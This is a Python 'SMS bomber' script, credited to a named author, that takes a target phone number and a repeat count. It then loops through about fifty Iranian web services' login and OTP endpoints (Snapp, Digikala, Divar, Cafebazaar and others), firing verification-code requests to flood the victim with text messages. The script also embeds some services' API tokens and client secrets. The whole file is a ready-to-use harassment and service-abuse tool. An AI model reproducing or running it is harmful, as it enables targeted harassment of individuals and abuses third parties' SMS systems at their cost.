import os

from requests import post, get
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
os.system("pip install requests")
os.system("clear")
print (f"""



          {lrd}CR :{lgn} EsfeLurM 
          
          {lrd}Channel Telegram :{lgn} https://t.me/esfelurm
          
          {lrd}Github :{lgn} github.com/esfelurm
          
    {lrd}Communication with the manufacturer : {lgn}esfelurm@yahoo.com
{lrd}
.d8888. .88b  d88. .d8888.   d8888b.  .d88b.  .88b  d88. d8888b. 
88'  YP 88'YbdP`88 88'  YP   88  `8D .8P  Y8. 88'YbdP`88 88  `8D 
`8bo.   88  88  88 `8bo.     88oooY' 88    88 88  88  88 88oooY' 
  `Y8b. 88  88  88   `Y8b.   88~~~b. 88    88 88  88  88 88~~~b. 
db   8D 88  88  88 db   8D   88   8D `8b  d8' 88  88  88 88   8D 
`8888Y' YP  YP  YP `8888Y'   Y8888P'  `Y88P'  YP  YP  YP Y8888P' 

 {yw}∧__∧
(  ･ω･)
(っ▄︻▇〓▄︻┻┳═一　{lrd}　sms sms sms sms{yw}
/　   )ﾊﾞﾊﾞﾊﾞﾊﾞ

( /￣∪           
""")
esfelurm = input(f"""{lrd}┌─<({cn}SMS{gn}@esfelurm{lrd})-{yw}[~]{lrd}>
└─< ({gn}Number{lrd}){pe}* {lrd}>──»  {cn}""")
try:
    NUmb = int(input(f"{cn}Number of sms : {lrd}"))
except:
    print ("NUMBER !")
Api = [
        {"phone":esfelurm},
        {"credential":{"phoneNumber":esfelurm,"role":"PASSENGER"}},
        {"api_version":"3","method":"sendCode","data":{"phone_number":esfelurm,"send_type":"SMS"}},
        {"cellphone":esfelurm},
        "send=1&cellphone="+esfelurm,
        "cellNumber="+esfelurm,
        {"phoneNumber":esfelurm},
        {"mobile":esfelurm,"country_code":"IR","provider_code":"RUBIKA"},
        {"phone":esfelurm},
        {"credential":{"phoneNumber":esfelurm,"role":"PASSENGER"}},
        {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":esfelurm}}},
        {"phone":esfelurm},
        {"data":{"mobile":esfelurm},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"},
        {"cellphone":esfelurm},
        {"mobile":esfelurm},
        {"username":esfelurm,"captchaHash":"","captchaValue":""},
        {"phone":esfelurm},
        {"mobile":esfelurm},
        {"username":esfelurm},
        {"number":esfelurm},
        {"phoneNumber":esfelurm,"AuthenticationMode":1},
        {"mobile":esfelurm},
        {"MobileNumber":esfelurm,"type":""},
        {"phone":esfelurm},
        {"phone":esfelurm},
        {"cellNumber":esfelurm,"device":{"deviceId":"f227ed1a-3ddf-4f42-bbea-606440e1ccb8","deviceModel":"WEB_BROWSER",        "deviceAPI":"WEB_BROWSER","osName":"WEB"}},
        {"mobile":esfelurm},
        {"phone":esfelurm,"headers":{"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"}},
        {"mobile":esfelurm},
        { 'cellphone':esfelurm},
        {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":esfelurm},
        {"mobile":esfelurm,"country_code":"+98"},
        {"UserName":esfelurm},
        {"method":"phone","identifier":esfelurm},
        {"username":esfelurm},
        {"credential":{"phoneNumber":esfelurm,"role":"PASSENGER"},"otpOption":"SMS"},
        {"cellphone":esfelurm},
        {"Type":3,"Username":esfelurm,"Password":None,"SourceChannel":"GF_L_40107_02","SourcePlatform":"OS","SourcePlatformAgentType":"Browser Name","SourcePlatformVersion":"Browser Version","FriendInviteCode":"FriendInviteCode","FreePackage":False,"GiftCode":None,"AppLog":{"DeviceName":"DeviceName","VersionName":"VersionName","VersionCode":0,"DeviceModel":"DeviceModel","OsVersion":"OsVersion","PhoneNo":esfelurm,"Email":"Email"}},
        {"way":"mobile","identity":esfelurm,"captchaPassToken":"9e928d74-4766-45dc-94ef-0ff4699b500f"},
        {"code":"98","phone":esfelurm,"smsStatus":"default"},       
]
for i in range(int(NUmb)):
    try:
        api = post ('https://api.divar.ir/v5/auth/authenticate', json=Api[0])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api2 = post ('https://messengerg2c42.iranlms.ir/', json=Api[2])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:    
        api3 = post ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', json=Api[3])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api4 = post ('https://web.emtiyaz.app/json/login', json=Api[4])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api5 = post ('https://bama.ir/signin-checkforcellnumber', json=Api[5])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api6 = post ('https://ws.alibaba.ir/api/v3/account/mobile/otp', json=Api[6])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api7 = post ('https://api.chartex.net/api/v2/user/validate', json=Api[7])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")     
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")  
    try:        
        api8 = post ('https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/', json=Api[8])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")   
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:       
        api9 = post ('https://drdr.ir/api/registerEnrollment/verifyMobile', json=Api[9])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try: 
        api10 = post ('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json=Api[10])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api11 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api[11])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api12 = post ('https://app.espard.com/api/v1/auth/identify-by-mobile', json=Api[12])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api13 = post ('https://a4baz.com/api/web/login', json=Api[13])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try: 
        api14 = post ('https://taraazws.jabama.com/api/v4/account/send-code', json=Api[14])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try: 
        api15 = post ('https://www.tebinja.com/api/v1/users', json=Api[15])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try: 
        api16 = post ('https://api2.anten.ir/users', json=Api[16])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api17 = post ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', json=Api[17])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")         
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api18 = post ('https://next.zarinpal.com/api/oauth/initialize', json=Api[18])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api19 = post ('https://api.mobit.ir/api/web/v8/register/register', json=Api[19])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api20 = post ('https://dayanshop.com/Auth/CheckPhoneNumber', json=Api[20])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api21 = post ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', json=Api[21])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")      
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api22 = post ('https://restcore.bimeh.com/v1/authentication', json=Api[22])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api23 = post ('https://diginext.ir/register/send-sms', json=Api[23])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api24 = post ('https://api.digikalajet.ir/user/login-register/', json=Api[24])       
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api25 = post ('https://app.mydigipay.com/digipay/api/users/send-sms', json=Api[25])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api26 = post ('https://app.itoll.ir/api/v1/auth/login', json=Api[26])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api27 = post ('https://mobapi.banimode.com/api/v2/auth/request', json=Api[27])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api28 = post ('https://tj8.ir/auth/register', json=Api[28])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api29 = post ('https://mamifood.org/Registration.aspx/IsUserAvailable', json=Api[29])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api30 = post ('https://restaurant.delino.com/user/register', json=Api[30])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api31 = post ('https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile', json=Api[31])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api32 = post ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', json=Api[32])     
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api33 = post ('https://virgool.io/api/v1.4/auth/verify', json=Api[33])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api34 = post ('https://www.sheypoor.com/api/v10.0.0/auth/send', json=Api[34])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api35 = get (f'https://api.binjo.ir/api/panel/get_code/{esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api36 = get (f'https://core.gap.im/v1/user/add.json?mobile={esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api37 = get (f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")   
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api38 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode=')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api39 = get (f'https://etma.ir/fa/Account/IsExistUserName?userName={esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api40 = get (f'https://api.digighate.com/user/code?phone={esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api41 = get (f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={esfelurm}&source=2&sendTokenIfNot=true')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api42 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode=+98')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api43 = get (f'https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile={esfelurm}')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api44 = get (f'https://filmnet.ir/api-v2/access-token/users/{esfelurm}/otp')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")         
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api45 = post ('https://api.tapsi.cab/api/v2.2/user', json=Api[35])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api46 = post ('https://api.pinwork.co/api/v1/customer/verification', json=Api[36])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api47 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api[37])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api48 = post ('https://accounts.inoor.ir/api/v1.0/register/chooseway', json=Api[38])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")     
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent") 
    try:
        api49 = post ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', json=Api[39])
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    
